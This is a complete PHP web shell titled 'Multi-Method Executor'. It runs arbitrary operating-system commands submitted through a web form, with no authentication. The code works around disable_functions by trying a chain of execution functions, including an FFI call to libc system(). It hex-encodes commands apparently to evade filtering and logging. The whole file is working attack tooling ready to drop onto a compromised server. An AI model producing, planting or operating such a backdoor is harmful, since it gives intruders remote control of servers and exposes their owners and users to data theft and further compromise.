<?php

class CommandExecutor {

    public static function getAvailableMethods() {
        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
        $isWindows = (PHP_OS_FAMILY === 'Windows');

        $methods = [
            'proc_open'   => function_exists('proc_open') && !in_array('proc_open', $disabled),
            'shell_exec'  => function_exists('shell_exec') && !in_array('shell_exec', $disabled),
            'exec'        => function_exists('exec') && !in_array('exec', $disabled),
            'system'      => function_exists('system') && !in_array('system', $disabled),
            'passthru'    => function_exists('passthru') && !in_array('passthru', $disabled),
            'popen'       => function_exists('popen') && !in_array('popen', $disabled),
            'pcntl_exec'  => !$isWindows && function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabled),
            'ffi'         => extension_loaded('ffi') && class_exists('FFI'),
            'expect'      => extension_loaded('expect') && function_exists('expect_popen') && !in_array('expect_popen', $disabled),
        ];

        return array_filter($methods);
    }

    public static function getBestMethod() {
        $available = self::getAvailableMethods();
        if (empty($available)) return null;

        $priority = ['proc_open', 'shell_exec', 'exec', 'system', 'passthru', 'popen', 'expect', 'ffi', 'pcntl_exec'];

        foreach ($priority as $method) {
            if (isset($available[$method]) && $available[$method]) {
                return $method;
            }
        }
        return array_key_first($available);
    }

    public static function run($cmd) {
        $method = self::getBestMethod();
        if (!$method) return "Execution blocked: All methods disabled.";

        switch ($method) {
            case 'proc_open':
                $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                $process = proc_open($cmd, $descriptors, $pipes);
                if (!is_resource($process)) return false;
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                proc_close($process);
                return $output;

            case 'shell_exec':
                return shell_exec($cmd);

            case 'exec':
                exec($cmd, $outputArray);
                return implode("\n", $outputArray);

            case 'system':
                ob_start(); system($cmd); return ob_get_clean();

            case 'passthru':
                ob_start(); passthru($cmd); return ob_get_clean();

            case 'popen':
                $handle = popen($cmd, 'r');
                if (!$handle) return false;
                $output = stream_get_contents($handle);
                pclose($handle);
                return $output;

            case 'expect':
                $stream = expect_popen($cmd);
                if (!$stream) return false;
                $output = stream_get_contents($stream);
                fclose($stream);
                return $output;

            case 'ffi':
                try {
                    $ffi = \FFI::cdef("int system(const char *command);", PHP_OS_FAMILY === 'Windows' ? 'msvcrt.dll' : 'libc.so.6');
                    ob_start(); $ffi->system($cmd); return ob_get_clean();
                } catch (\Throwable $e) { return false; }

            case 'pcntl_exec':
                return pcntl_exec('/bin/sh', ['-c', $cmd]);

            default:
                return false;
        }
    }
}

// Handle Incoming POST request with Hex decoding
$output = "";
$selectedMethod = CommandExecutor::getBestMethod();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd_hex'])) {
    // Decode Hex payload back to raw string command
    $rawHex = trim($_POST['cmd_hex']);
    $cmd = @hex2bin($rawHex);

    if ($cmd !== false) {
        $output = CommandExecutor::run($cmd);
    } else {
        $output = "Error: Invalid Hex payload provided.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dynamic Command Executor</title>
    <style>
        body { font-family: monospace; background: #121212; color: #00ff66; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,255,102,0.2); }
        input[type="text"] { width: 70%; padding: 10px; background: #2d2d2d; border: 1px solid #444; color: #fff; font-family: monospace; }
        button { padding: 10px 20px; background: #00ff66; color: #121212; border: none; font-weight: bold; cursor: pointer; }
        button:hover { background: #00cc52; }
        pre { background: #111; padding: 15px; border: 1px solid #333; overflow-x: auto; color: #fff; }
        .meta { color: #888; font-size: 0.9em; margin-bottom: 15px; }
    </style>
    <script>
        // Automatically convert input string to Hex string before submitting POST form
        function submitHexForm(event) {
            event.preventDefault();
            const plainInput = document.getElementById('commandInput').value;
            
            // Encode plain text to Hex
            let hexOutput = '';
            for (let i = 0; i < plainInput.length; i++) {
                hexOutput += plainInput.charCodeAt(i).toString(16).padStart(2, '0');
            }

            document.getElementById('cmdHexField').value = hexOutput;
            document.getElementById('execForm').submit();
        }
    </script>
</head>
<body>
<div class="container">
    <h2>Multi-Method Executor (Hex POST)</h2>
    <div class="meta">
        OS Family: <strong><?php echo PHP_OS_FAMILY; ?></strong> | 
        Active Engine: <strong style="color: #00ff66;"><?php echo htmlspecialchars($selectedMethod ?? 'None'); ?></strong>
    </div>

    <form id="execForm" method="POST" onsubmit="submitHexForm(event)">
        <input type="hidden" id="cmdHexField" name="cmd_hex">
        <input type="text" id="commandInput" placeholder="Enter command (e.g., uname -a or dir)..." autocomplete="off" required>
        <button type="submit">Execute</button>
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <h3>Output:</h3>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</div>
</body>
</html>
